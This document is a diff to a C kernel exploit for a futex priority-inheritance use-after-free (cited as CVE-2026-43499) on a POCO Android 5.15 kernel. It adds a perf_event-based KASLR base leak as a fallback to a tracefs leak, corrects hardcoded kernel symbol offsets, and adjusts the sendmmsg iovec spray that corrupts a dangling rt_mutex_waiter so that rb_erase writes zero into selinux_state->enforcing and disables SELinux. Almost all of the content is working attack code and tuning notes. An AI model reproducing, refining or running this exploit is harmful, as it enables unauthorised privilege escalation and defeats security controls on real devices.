@@ -4,10 +4,9 @@
 // Adapted from the a54x working poc.c (zainarbani / telegram author, confirmed
 // write-0 to selinux_state->enforcing on 5.15.189). The ONLY changes from the
 // a54x original:
-//   1) KASLR: tracefs sched_blocked_reason slide leak (reliable; leaks the
+//     1) KASLR: tracefs sched_blocked_reason slide leak (primary; leaks the
 //      fixed return address of bl schedule inside worker_thread -> exact slide).
-//      (the old perf-event min-IP leak was unreliable: the sampled min IP floats
-//      around the image, so the computed base was off by a non-constant amount.)
+//      perf-event min-IP leak is a fallback when tracefs captures 0 samples.
 //   2) ksym_offs[] = POCO 5.15.180 link-time offsets (relative to _text).
 //   3) PROBE mode (env PROBE=1): spray valid user-address sentinels
 //      (0xabcdef00|i<<8) in all waiter fields except lock=fake_lock.
@@ -26,7 +25,7 @@
 //   is garbage when read as an rt_mutex):
 //   sendmmsg iovec spray overwrites Y's dangling rt_mutex_waiter on its own
 //   kernel stack (CVE-2026-43499 UAF left by the PI-cycle EDEADLK). waiter.task
-//   -> init_task, waiter.lock -> ZEROED fake rt_mutex (owner==0, wait_lock==0,
+//   -> zeroed-BSS dead-end (kills POCO idle PI walk), waiter.lock -> ZEROED fake rt_mutex (owner==0, wait_lock==0,
 //   empty tree) so the walk exits cleanly. PHASE1 settles the ghost. PHASE2 re-sprays
 //   tree_entry.__rb_parent_color=selinux_state-8 with children=0, lock=fresh
 //   uid_lock+0x300 (distinct zeroed BSS rt_mutex), re-trigger -> rb_erase NULL-writes
@@ -54,6 +53,8 @@
 #include <stdarg.h>
 #include <sys/select.h>
 #include <sys/wait.h>
+#include <linux/perf_event.h>
+#include <sys/ioctl.h>
 
 #define FUTEX_LOCK_PI             6
 #define FUTEX_UNLOCK_PI           7
@@ -72,28 +73,36 @@
 #ifndef KEYCTL_INSTANTIATE_IOV
 #define KEYCTL_INSTANTIATE_IOV 12
 #endif
+#ifndef __NR_perf_event_open
+#define __NR_perf_event_open 241
+#endif
 
 /* ── POCO air 5.15.180 GKI ─────────────────────────────────────────────────── */
 #define KIMAGE_TEXT_BASE     0xffffffc008000000ULL
 
 /* Link-time offsets (nm of kernel_5-15-180-vmlinux.elf, _text=0xffffffc008000000).
- * Runtime VA = KIMAGE_TEXT_BASE + slide + off. */
+ * Runtime VA = KIMAGE_TEXT_BASE + slide + off.
+ * IMPORTANT (item 1 fix, 2026-08-18): the raw nm link offsets for BSS/DATA symbols
+ * are 0x8000000 too high (they carry the image base 0xffffffc00a... high bits).
+ * Subtract 0x8000000 so the computed VA matches poc-mcast's proven-working values
+ * and lands in the actually-mapped .bss. The old "page-table mismatch / pivot to
+ * physrw" conclusion was caused by this unfixed offset bug. */
 struct ksym_off { const char *name; uint64_t off; };
 static const struct ksym_off ksym_offs[] = {
-    { "empty_zero_page",  0xad53000ULL },
-    { "init_cred",        0xabfd698ULL },
-    { "init_task",        0xac43640ULL },
-    { "modprobe_path",    0xab24120ULL },
-    { "selinux_state",    0xada9d78ULL },   /* enforcing @ +0 */
-    { "panic_timeout",    0xab20680ULL },
-    { "inet6_protos",     0xab0b3f8ULL },   /* RO on this build — do NOT use as fake_lock */
-    { "uid_lock",         0xadca680ULL },   /* writable BSS spinlock; anchor for ZEROED fake_lock at +0x200/+0x300 */
-    { "kmalloc_caches",   0xa164a60ULL },   /* low pre-init .data — UNTESTED mapped fake_lock candidate */
-    { "security_hook_heads", 0xa1617e0ULL },/* low pre-init .data — UNTESTED mapped fake_lock candidate */
-    { "init_mm",          0xac87a28ULL },   /* GAP region (unmapped, for comparison) */
-    { "root_task_group",  0xad57ac0ULL },   /* .bss (unmapped, for comparison) */
-    { "memstart_addr",    0xa164a50ULL },
-    { "kimage_voffset",   0xa164a58ULL },
+    { "empty_zero_page",  0x2d53000ULL },
+    { "init_cred",        0x2bfd698ULL },
+    { "init_task",        0x2c43640ULL },
+    { "modprobe_path",    0x2b24120ULL },
+    { "selinux_state",    0x2da9d78ULL },   /* enforcing @ +0 */
+    { "panic_timeout",    0x2b20680ULL },
+    { "inet6_protos",     0x2b0b3f8ULL },   /* RO on this build — do NOT use as fake_lock */
+    { "uid_lock",         0x2dca680ULL },   /* writable BSS spinlock; anchor for ZEROED fake_lock at +0x200/+0x300 */
+    { "kmalloc_caches",   0x2164a60ULL },   /* low pre-init .data — UNTESTED mapped fake_lock candidate */
+    { "security_hook_heads", 0x21617e0ULL },/* low pre-init .data — UNTESTED mapped fake_lock candidate */
+    { "init_mm",          0x2c87a28ULL },   /* GAP region (unmapped, for comparison) */
+    { "root_task_group",  0x2d57ac0ULL },   /* .bss (unmapped, for comparison) */
+    { "memstart_addr",    0x2164a50ULL },
+    { "kimage_voffset",   0x2164a58ULL },
 };
 
 static uint64_t kaslr_base  = KIMAGE_TEXT_BASE;
@@ -197,24 +206,164 @@ static uint64_t tracefs_leak_text_base(void) {
     tracefs_write("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");
     tracefs_write("/sys/kernel/tracing/tracing_on", "0");
     if (n == 0) { fprintf(stderr, "[kaslr] no sched_blocked_reason samples\n"); return 0; }
-    /* modal caller == worker_thread's schedule-return address */
-    uint64_t mode = 0; int modecnt = 0;
+
+    uint64_t linked = KIMAGE_TEXT_BASE + SLIDE_WORKER_CALLER_OFF;
+
+    /* Rank candidates by frequency; prefer addresses whose low 21 bits match the
+     * known worker_thread schedule-return offset (robust against modal drift). */
+    typedef struct { uint64_t addr; int cnt; } cand_t;
+    cand_t cands[4096]; int nc = 0;
     for (int i = 0; i < n; i++) {
         int c = 0; for (int j = 0; j < n; j++) if (callers[j] == callers[i]) c++;
-        if (c > modecnt) { modecnt = c; mode = callers[i]; }
+        int dup = 0;
+        for (int k = 0; k < nc; k++) if (cands[k].addr == callers[i]) { dup = 1; break; }
+        if (!dup && nc < 4096) { cands[nc].addr = callers[i]; cands[nc].cnt = c; nc++; }
     }
-    uint64_t linked = KIMAGE_TEXT_BASE + SLIDE_WORKER_CALLER_OFF;
-    int64_t slide = (int64_t)mode - (int64_t)linked;
-    if (slide <= 0 || (slide & 0x1fffff) != 0 || slide > (int64_t)0x4000000000ULL) {
-        fprintf(stderr, "[kaslr] slide reject %016llx (mode %016llx cnt %d)\n",
-                (unsigned long long)slide, (unsigned long long)mode, modecnt);
+    for (int i = 0; i < nc - 1; i++)
+        for (int j = i + 1; j < nc; j++) {
+            int pi = (cands[i].addr & 0x1fffff) == (SLIDE_WORKER_CALLER_OFF & 0x1fffff);
+            int pj = (cands[j].addr & 0x1fffff) == (SLIDE_WORKER_CALLER_OFF & 0x1fffff);
+            if (pj && !pi) { cand_t t = cands[i]; cands[i] = cands[j]; cands[j] = t; continue; }
+            if (pi == pj && cands[j].cnt > cands[i].cnt) {
+                cand_t t = cands[i]; cands[i] = cands[j]; cands[j] = t;
+            }
+        }
+
+    for (int ci = 0; ci < nc; ci++) {
+        uint64_t mode = cands[ci].addr;
+        int modecnt = cands[ci].cnt;
+        int64_t slide = (int64_t)mode - (int64_t)linked;
+        if (slide <= 0 || (slide & 0x1fffff) != 0 || slide > (int64_t)0x4000000000ULL) {
+            fprintf(stderr, "[kaslr] tracefs candidate #%d: mode=%016llx cnt=%d slide=%016llx (rejected)\n",
+                    ci, (unsigned long long)mode, modecnt, (unsigned long long)slide);
+            continue;
+        }
+        int64_t kaslr_off = env_signed("KASLR_OFF", 0); /* tracefs is exact; 0 unless overridden */
+        int64_t base = (int64_t)(KIMAGE_TEXT_BASE + (uint64_t)slide) + kaslr_off;
+        fprintf(stderr, "[kaslr] tracefs base=%016llx slide=%016llx (mode cnt %d, samples %d, candidate #%d mode=%016llx)\n",
+                (unsigned long long)(uint64_t)base, (unsigned long long)slide, modecnt, n, ci, (unsigned long long)mode);
+        return (uint64_t)base;
+    }
+
+    fprintf(stderr, "[kaslr] tracefs slide reject (no valid candidate)\n");
+    return 0;
+}
+
+/* PERF KASLR SLIDE LEAK (fallback when tracefs captures 0 samples).
+ * Mirrors poc-mcast SECTION 7: PERF_COUNT_SW_CPU_CLOCK with kernel IP samples;
+ * the minimum kernel IP (aligned) is the text base. KASLR_OFF (default 0) may override. */
+#ifndef PERF_LEAK_ALIGN
+#define PERF_LEAK_ALIGN 0x200000ULL
+#endif
+#ifndef PERF_LEAK_MMAP_PAGES
+#define PERF_LEAK_MMAP_PAGES 8
+#endif
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+
+static uint64_t perf_leak_text_base(void)
+{
+    int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
+    if (pfd >= 0) {
+        char pbuf[16];
+        ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
+        close(pfd);
+        if (pn > 0) {
+            pbuf[pn] = 0;
+            if (atoi(pbuf) > 1) {
+                fprintf(stderr, "[kaslr] perf fallback: perf_event_paranoid too high\n");
+                return 0;
+            }
+        }
+    }
+
+    struct perf_event_attr pe;
+    memset(&pe, 0, sizeof(pe));
+    pe.type = PERF_TYPE_SOFTWARE;
+    pe.config = PERF_COUNT_SW_CPU_CLOCK;
+    pe.size = sizeof(pe);
+    pe.sample_period = 1;
+    pe.sample_type = PERF_SAMPLE_IP;
+    pe.exclude_user = 1;
+    pe.exclude_hv = 1;
+    pe.disabled = 1;
+    pe.wakeup_events = 1;
+
+    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+    if (fd < 0) {
+        pe.sample_period = 100000;
+        fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+    }
+    if (fd < 0) {
+        fprintf(stderr, "[kaslr] perf fallback: perf_event_open errno=%d\n", errno);
         return 0;
     }
-    int64_t kaslr_off = env_signed("KASLR_OFF", 0); /* tracefs is exact; 0 unless overridden */
-    int64_t base = (int64_t)(KIMAGE_TEXT_BASE + (uint64_t)slide) + kaslr_off;
-    fprintf(stderr, "[kaslr] tracefs base=%016llx slide=%016llx (mode cnt %d, samples %d)\n",
-            (unsigned long long)(uint64_t)base, (unsigned long long)slide, modecnt, n);
-    return (uint64_t)base;
+
+    size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
+    void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
+                          MAP_SHARED, fd, 0);
+    if (mmap_buf == MAP_FAILED) {
+        fprintf(stderr, "[kaslr] perf fallback: mmap errno=%d\n", errno);
+        close(fd);
+        return 0;
+    }
+
+    struct perf_event_mmap_page *header =
+        (struct perf_event_mmap_page *)mmap_buf;
+    uint64_t min_kip = ~(uint64_t)0;
+    int kernel_samples = 0;
+
+    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+
+    for (volatile long i = 0; i < 500000; i++) {
+        if ((i % 10000) == 0) sched_yield();
+    }
+
+    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+    uint64_t data_tail = header->data_tail;
+    uint64_t data_head = header->data_head;
+    __sync_synchronize();
+    uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
+    uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;
+
+    while (data_tail < data_head) {
+        struct perf_event_header *ev =
+            (struct perf_event_header *)(base + (data_tail % data_size));
+        if (ev->size == 0) break;
+        if (data_tail + ev->size > data_head) break;
+        if (ev->type == PERF_RECORD_SAMPLE &&
+            (ev->misc & PERF_RECORD_MISC_KERNEL)) {
+            uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
+            if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
+                min_kip = ip;
+            }
+            kernel_samples++;
+        }
+        data_tail += ev->size;
+    }
+
+    munmap(mmap_buf, mmap_size);
+    close(fd);
+
+    if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
+        fprintf(stderr, "[kaslr] perf fallback: no kernel samples collected\n");
+        return 0;
+    }
+
+    uint64_t text_base = min_kip & ~(PERF_LEAK_ALIGN - 1);
+    if (text_base < KIMAGE_TEXT_BASE) {
+        fprintf(stderr, "[kaslr] perf fallback: out of range %016llx\n",
+                (unsigned long long)text_base);
+        return 0;
+    }
+    int64_t kaslr_off = env_signed("KASLR_OFF", 0);
+    uint64_t base_out = (uint64_t)((int64_t)text_base + kaslr_off);
+    fprintf(stderr, "[kaslr] perf base=%016llx (samples %d min_kip=%016llx)\n",
+            (unsigned long long)base_out, kernel_samples, (unsigned long long)min_kip);
+    return base_out;
 }
 
 /* ── futex / syscalls ──────────────────────────────────────────────────────── */
@@ -275,8 +424,8 @@ static void do_spray(int fd, struct iovec *iov) {
 /* ── resolved symbols ──────────────────────────────────────────────────────── */
 static unsigned long kaddr_init_cred, kaddr_init_task, kaddr_modprobe, kaddr_selinux, kaddr_panic;
 static unsigned long kaddr_empty_zero_page;
-static unsigned long fake_lock_addr, fake_lock2_addr;
-static unsigned long k_safe_write_value;
+static unsigned long fake_lock_addr, fake_lock2_addr, k_ghost_task;
+static unsigned long k_safe_write_value, k_val2mb;
 
 static int y_sched_policy = SCHED_NORMAL;
 static long trigger_adj_pi(pid_t tid) {
@@ -366,9 +515,9 @@ static void *thread_Y(void *arg) {
          int d = g_iov_idx;
          fprintf(stderr,"[Y] PHASE1 spray: settle ghost (d=%d method=%s: li=%d parent@iov0..%d)\n",
                  d, g_spray_method, li, d+2);
-         for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
-         iov[li].iov_base = (void *)kaddr_init_task;
-         iov[li].iov_len  = (unsigned long)fake_lock_addr;
+        for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
+        iov[li].iov_base = (void *)k_ghost_task;
+        iov[li].iov_len  = (unsigned long)fake_lock_addr;
     }
 
     struct mmsghdr { struct msghdr msg_hdr; unsigned int msg_len; };
@@ -382,7 +531,7 @@ static void *thread_Y(void *arg) {
 
       /* PHASE 2 (write): re-spray the poisoned waiter precisely at displacement
        * d=g_iov_idx: __rb_parent_color = selinux-8, rb_right = k_safe_write_value
-       * (empty_zero_page: low byte 0x00 -> enforcing=0, byte2 0x53 -> initialized=1),
+       * (empty_zero_page address: LE bytes 00 30 95 f8... -> enforcing=0, checkreqprot=0x30, initialized=0x95 non-zero),
        * rb_left = 0, lock = fake_lock2 (fresh zeroed BSS rt_mutex @ uid_lock+0x300).
        * rb_erase sees ghost has a child (rb_right != NULL), so child = k_safe_write_value.
        * parent->rb_right = child writes the safe value to selinux_state->enforcing (+0).
@@ -395,9 +544,9 @@ static void *thread_Y(void *arg) {
            for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
            iov[d].iov_base   = (void *)(kaddr_selinux - 8);    /* __rb_parent_color = selinux-8 (waiter+0x00) */
            iov[d].iov_len    = (unsigned long)k_safe_write_value; /* rb_right = safe value -> rb_erase writes it to selinux enforcing */
-           if (d + 1 < 8) iov[d+1].iov_base = (void *)0x0UL;   /* rb_left = 0 */
-           iov[li].iov_base = (void *)kaddr_init_task;        /* waiter->task */
-           iov[li].iov_len  = (unsigned long)fake_lock2_addr; /* waiter->lock = ZEROED fake_lock2 */
+            if (d + 1 < 8) iov[d+1].iov_base = (void *)0x0UL;   /* rb_left = 0 */
+            iov[li].iov_base = (void *)k_ghost_task;        /* waiter->task = zeroed-BSS dead-end */
+            iov[li].iov_len  = (unsigned long)fake_lock2_addr; /* waiter->lock = ZEROED fake_lock2 */
            do_spray(sv[0], iov);
      }
     atomic_store_explicit(&respray_done, 1, memory_order_release);
@@ -504,7 +653,11 @@ int main(void) {
     fprintf(stderr,"[main] g_iov_idx=%d (override with IOV_IDX=k)  spray=%s\n", g_iov_idx, g_spray_method);
 
     kaslr_base = tracefs_leak_text_base();
-    if (!kaslr_base) { fprintf(stderr,"[kaslr] FATAL: tracefs leak failed\n"); return EXIT_FAILURE; }
+    if (!kaslr_base) {
+        fprintf(stderr, "[kaslr] tracefs leak failed; trying perf fallback\n");
+        kaslr_base = perf_leak_text_base();
+    }
+    if (!kaslr_base) { fprintf(stderr,"[kaslr] FATAL: both KASLR leaks failed\n"); return EXIT_FAILURE; }
     kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
     fprintf(stderr,"[kaslr] base=0x%lx slide=0x%lx\n", kaslr_base, kaslr_slide);
 
@@ -529,12 +682,16 @@ int main(void) {
         fake_lock_addr  = resolve("uid_lock") + 0x200;
         fake_lock2_addr = resolve("uid_lock") + 0x300;
     }
-    k_safe_write_value = kaddr_empty_zero_page;       /* low byte 0x00 -> enforcing=0; byte2 nonzero -> initialized stays 1 */
+    k_ghost_task = fake_lock_addr + 0x2000;       /* item 4: zeroed BSS dead-end so POCO idle PI walk terminates (mirrors poc-mcast Option 1) */
+    k_val2mb     = fake_lock_addr & ~0x1FFFFFUL;   /* item 6: writable 2MB-aligned BSS value for a step2 (policycap) write if Blocker B solved */
+    k_safe_write_value = kaddr_empty_zero_page;       /* item 6: writable mapped page (its address is written; rb_erase back-writes __rb_parent_color into it, so MUST be writable). LE bytes 00 30 95 f8... clear enforcing */
     fprintf(stderr,"  init_task   = 0x%lx\n", kaddr_init_task);
     fprintf(stderr,"  selinux_state = 0x%lx (enforcing @ +0)\n", kaddr_selinux);
     fprintf(stderr,"  fake_lock   = 0x%lx (uid_lock+0x200, ZEROED BSS rt_mutex)\n", fake_lock_addr);
     fprintf(stderr,"  fake_lock2  = 0x%lx (uid_lock+0x300, ZEROED BSS rt_mutex)\n", fake_lock2_addr);
-    fprintf(stderr,"  safe_write  = 0x%lx (empty_zero_page: low byte 0x00, byte2 0x53)\n", k_safe_write_value);
+    fprintf(stderr,"  safe_write  = 0x%lx (empty_zero_page addr: byte0=0x00 enforcing, byte2=0x95 initialized)\n", k_safe_write_value);
+    fprintf(stderr,"  ghost_task  = 0x%lx (zeroed BSS dead-end, +0x2000)\n", k_ghost_task);
+    fprintf(stderr,"  val2mb      = 0x%lx (writable 2MB-aligned BSS; step2 value if Blocker B solved)\n", k_val2mb);
     if (!kaddr_init_task || !fake_lock_addr || !kaddr_selinux) {
         fprintf(stderr,"[main] FATAL: unresolved symbols\n"); return EXIT_FAILURE;
     }
